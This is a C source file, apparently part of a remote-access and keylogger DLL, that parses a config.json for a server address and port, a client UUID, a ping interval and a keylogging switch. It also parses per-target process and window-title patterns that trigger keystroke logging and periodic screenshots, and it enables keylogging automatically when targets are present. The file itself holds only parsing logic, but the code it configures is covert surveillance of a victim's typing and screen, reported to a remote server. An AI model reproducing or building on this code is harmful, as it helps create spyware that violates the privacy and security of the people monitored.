/**
 * remote_config.c
 * Minimal config.json parser for ServerAddress and ServerPort.
 * No external JSON library; single-file implementation.
 */
#include "pch.h"
#include "remote_config.h"
#include "remote_log.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CONFIG_MAX_FILE 4096
#define CONFIG_FILENAME "config.json"

static void trim_whitespace(const char** p) {
    while (**p == ' ' || **p == '\t' || **p == '\r' || **p == '\n') (*p)++;
}

static int split_csv_patterns(const char* s, char patterns[][KEYLOGGER_MAX_PATTERN_LEN], int max_patterns, int* out_count) {
    if (!s || !out_count || max_patterns <= 0) return 0;
    *out_count = 0;

    const char* p = s;
    while (*p && *out_count < max_patterns) {
        while (*p == ' ' || *p == '\t') p++;
        const char* start = p;
        while (*p && *p != ',') p++;
        const char* end = p;

        // trim trailing spaces
        while (end > start && (end[-1] == ' ' || end[-1] == '\t')) end--;

        int len = (int)(end - start);
        if (len > 0) {
            if (len >= KEYLOGGER_MAX_PATTERN_LEN) len = KEYLOGGER_MAX_PATTERN_LEN - 1;
            memcpy(patterns[*out_count], start, len);
            patterns[*out_count][len] = '\0';
            (*out_count)++;
        }

        if (*p == ',') p++;
    }
    return 1;
}

static int parse_patterns_value(const char* json, const char* key,
    char patterns[][KEYLOGGER_MAX_PATTERN_LEN], int max_patterns, int* out_count) {
    if (!json || !key || !patterns || !out_count) return 0;
    *out_count = 0;

    char search[96];
    _snprintf_s(search, _countof(search), _TRUNCATE, "\"%s\"", key);
    const char* pos = strstr(json, search);
    if (!pos) return 0;
    pos += strlen(search);
    trim_whitespace(&pos);
    if (*pos != ':') return 0;
    pos++;
    trim_whitespace(&pos);

    if (*pos == '"') {
        pos++;
        char tmp[1024] = { 0 };
        size_t i = 0;
        while (*pos && *pos != '"' && i < sizeof(tmp) - 1) {
            tmp[i++] = *pos++;
        }
        tmp[i] = '\0';
        if (tmp[0] == '\0') { *out_count = 0; return 1; }
        split_csv_patterns(tmp, patterns, max_patterns, out_count);
        return 1;
    }

    if (*pos == '[') {
        // Empty array: []
        pos++;
        trim_whitespace(&pos);
        if (*pos == ']') {
            *out_count = 0;
            return 1;
        }

        // Parse repeated "string" elements inside the array.
        while (*pos && *pos != ']' && *out_count < max_patterns) {
            trim_whitespace(&pos);
            if (*pos != '"') {
                // Skip until next quote.
                pos++;
                continue;
            }
            pos++;
            char tmp[1024] = { 0 };
            size_t i = 0;
            while (*pos && *pos != '"' && i < sizeof(tmp) - 1) {
                tmp[i++] = *pos++;
            }
            tmp[i] = '\0';
            if (*pos == '"') pos++; /* consume closing quote */
            if (tmp[0]) {
                // tmp may contain CSV patterns (e.g. "*a*,*b*"), so split it and append.
                int tmp_count = 0;
                char tmp_patterns[KEYLOGGER_MAX_PATTERNS][KEYLOGGER_MAX_PATTERN_LEN];
                if (split_csv_patterns(tmp, tmp_patterns, KEYLOGGER_MAX_PATTERNS, &tmp_count)) {
                    for (int k = 0; k < tmp_count && *out_count < max_patterns; k++) {
                        strncpy_s(patterns[*out_count], KEYLOGGER_MAX_PATTERN_LEN, tmp_patterns[k], _TRUNCATE);
                        (*out_count)++;
                    }
                }
            }

            // Skip commas/spaces until next quote or end array.
            while (*pos && *pos != '"' && *pos != ']') pos++;
            if (*pos == ']') break;
        }
        return 1;
    }

    // Unknown value type
    return 0;
}

/* Forward declarations (used by parse_targets_array below). */
static int parse_bool_value(const char* json, const char* key, int* out);
static int parse_int_value(const char* json, const char* key, int* out);

static int parse_targets_array(const char* json, remote_config_t* out_config) {
    if (!json || !out_config) return 0;
    out_config->target_count = 0;

    char search[32] = "\"targets\"";
    const char* targetsPos = strstr(json, search);
    if (!targetsPos) return 1; // missing -> empty

    const char* arrStart = strchr(targetsPos, '[');
    if (!arrStart) return 1;
    const char* p = arrStart + 1;

    const char* end = json + strlen(json);
    while (p < end && out_config->target_count < KEYLOGGER_MAX_TARGETS) {
        // Find next '{'
        while (p < end && *p != '{' && *p != ']') p++;
        if (p >= end || *p == ']') break;

        const char* objStart = p;
        int depth = 0;
        while (p < end) {
            if (*p == '{') depth++;
            else if (*p == '}') {
                depth--;
                if (depth == 0) {
                    p++; // include '}'
                    break;
                }
            }
            p++;
        }
        if (depth != 0) break;

        size_t objLen = (size_t)(p - objStart);
        if (objLen == 0) continue;
        if (objLen > 2048) objLen = 2048;

        char objBuf[2048];
        memcpy(objBuf, objStart, objLen);
        objBuf[objLen - 1] = '\0';

        int keyboard = 0;
        int save_screenshots = 0;
        int screenshot_interval_sec = 1;
        (void)parse_bool_value(objBuf, "keyboard", &keyboard);
        (void)parse_bool_value(objBuf, "save_screenshots", &save_screenshots);
        (void)parse_int_value(objBuf, "screenshot_interval_sec", &screenshot_interval_sec);
        if (screenshot_interval_sec <= 0) screenshot_interval_sec = 1;

        // Parse patterns: if processes is empty, skip the target object.
        int proc_count = 0;
        int title_count = 0;
        (void)parse_patterns_value(objBuf, "processes",
            out_config->targets[out_config->target_count].process_patterns,
            KEYLOGGER_MAX_PATTERNS, &proc_count);
        out_config->targets[out_config->target_count].process_pattern_count = proc_count;

        (void)parse_patterns_value(objBuf, "titles",
            out_config->targets[out_config->target_count].title_patterns,
            KEYLOGGER_MAX_PATTERNS, &title_count);
        out_config->targets[out_config->target_count].title_pattern_count = title_count;

        // Requirement: if processes is empty, we can skip that element.
        if (proc_count == 0) continue;

        out_config->targets[out_config->target_count].keyboard = keyboard ? 1 : 0;
        out_config->targets[out_config->target_count].save_screenshots = save_screenshots ? 1 : 0;
        out_config->targets[out_config->target_count].screenshot_interval_sec = screenshot_interval_sec;

        out_config->target_count++;
    }
    return 1;
}

static int parse_string_value(const char* json, const char* key, char* out, size_t out_size) {
    char search[64];
    _snprintf_s(search, _countof(search), _TRUNCATE, "\"%s\"", key);
    const char* pos = strstr(json, search);
    if (!pos) return 0;
    pos += strlen(search);
    trim_whitespace(&pos);
    if (*pos != ':') return 0;
    pos++;
    trim_whitespace(&pos);
    if (*pos != '"') return 0;
    pos++;
    size_t i = 0;
    while (pos[i] && pos[i] != '"' && i < out_size - 1) {
        out[i] = pos[i];
        i++;
    }
    out[i] = '\0';
    return 1;
}

static int parse_bool_value(const char* json, const char* key, int* out) {
    char search[64];
    _snprintf_s(search, _countof(search), _TRUNCATE, "\"%s\"", key);
    const char* pos = strstr(json, search);
    if (!pos) return 0;
    pos += strlen(search);
    trim_whitespace(&pos);
    if (*pos != ':') return 0;
    pos++;
    trim_whitespace(&pos);
    if (strncmp(pos, "true", 4) == 0) { *out = 1; return 1; }
    if (strncmp(pos, "false", 5) == 0) { *out = 0; return 1; }
    return 0;
}

static int parse_int_value(const char* json, const char* key, int* out) {
    char search[64];
    _snprintf_s(search, _countof(search), _TRUNCATE, "\"%s\"", key);
    const char* pos = strstr(json, search);
    if (!pos) return 0;
    pos += strlen(search);
    trim_whitespace(&pos);
    if (*pos != ':') return 0;
    pos++;
    trim_whitespace(&pos);
    *out = (int)strtol(pos, NULL, 10);
    return 1;
}

int remote_config_load(remote_config_t* out_config) {
    if (!out_config) return 0;
    memset(out_config, 0, sizeof(*out_config));
    out_config->server_port = 4782; /* default */
    out_config->target_count = 0;

    char path[MAX_PATH];
    /* Resolve directory of this DLL (not the host EXE), so config.json next to remote.dll works. */
    HMODULE hModule = NULL;
    DWORD len = 0;
    if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)&remote_config_load, &hModule)) {
        len = GetModuleFileNameA(hModule, path, MAX_PATH);
    }
    if (len == 0 || len >= MAX_PATH) {
        /* Fallback: host executable directory. */
        len = GetModuleFileNameA(NULL, path, MAX_PATH);
    }
    if (len == 0 || len >= MAX_PATH) {
        remote_log("config: GetModuleFileName failed");
        return 0;
    }

    /* Replace module name with config filename */
    {
        char* last_slash = strrchr(path, '\\');
        if (last_slash) *(last_slash + 1) = '\0';
        else path[0] = '\0';
        strcat_s(path, MAX_PATH, CONFIG_FILENAME);
    }

    FILE* f = NULL;
    if (fopen_s(&f, path, "r") != 0 || !f) {
        remote_log("config: not found at %s, trying cwd", path);
        if (fopen_s(&f, CONFIG_FILENAME, "r") != 0 || !f) {
            remote_log("config: not found at " CONFIG_FILENAME);
            return 0;
        }
    }

    char buf[CONFIG_MAX_FILE];
    size_t n = fread(buf, 1, CONFIG_MAX_FILE - 1, f);
    fclose(f);
    if (n == 0) return 0;
    buf[n] = '\0';

    if (!parse_string_value(buf, "ServerAddress", out_config->server_address, sizeof(out_config->server_address)))
        strcpy_s(out_config->server_address, sizeof(out_config->server_address), "127.0.0.1");
    /* Optional stable client UUID (64 chars). If missing/invalid length, client falls back to generating one. */
    (void)parse_string_value(buf, "Uuid", out_config->uuid, sizeof(out_config->uuid));
    if (out_config->uuid[0] == '\0') {
        /* Be tolerant to different json casing. */
        (void)parse_string_value(buf, "uuid", out_config->uuid, sizeof(out_config->uuid));
    }
    if (out_config->uuid[0] == '\0') {
        /* Some clients may provide "UUID" (all-caps). */
        (void)parse_string_value(buf, "UUID", out_config->uuid, sizeof(out_config->uuid));
    }

    int port = 0;
    if (parse_int_value(buf, "ServerPort", &port) && port > 0 && port <= 65535)
        out_config->server_port = (unsigned short)port;
    int trans = 90;
    if (parse_int_value(buf, "GhostTransparency", &trans) && trans >= 0 && trans <= 100)
        out_config->ghost_transparency = trans;
    else
        out_config->ghost_transparency = 90;
    int kl = 0;
    int keylogging_found = 0;
    if (parse_bool_value(buf, "Keylogging", &kl)) {
        out_config->keylogging = kl;
        keylogging_found = 1;
    } else if (parse_int_value(buf, "Keylogging", &kl) && (kl == 0 || kl == 1)) {
        out_config->keylogging = kl;
        keylogging_found = 1;
    } else {
        out_config->keylogging = 0;
    }

    int pim = 0;
    /* ping_interval_minutes is optional; when <= 0 ping is disabled. */
    if (parse_int_value(buf, "ping_interval_minutes", &pim) && pim > 0)
        out_config->ping_interval_minutes = pim;
    else
        out_config->ping_interval_minutes = 0;

    /* Parse targets array (optional). */
    (void)parse_targets_array(buf, out_config);

    /* If targets are provided but Keylogging key is missing, enable keylogging automatically. */
    if (!keylogging_found && out_config->target_count > 0) {
        out_config->keylogging = 1;
    }

    out_config->valid = 1;
    return 1;
}
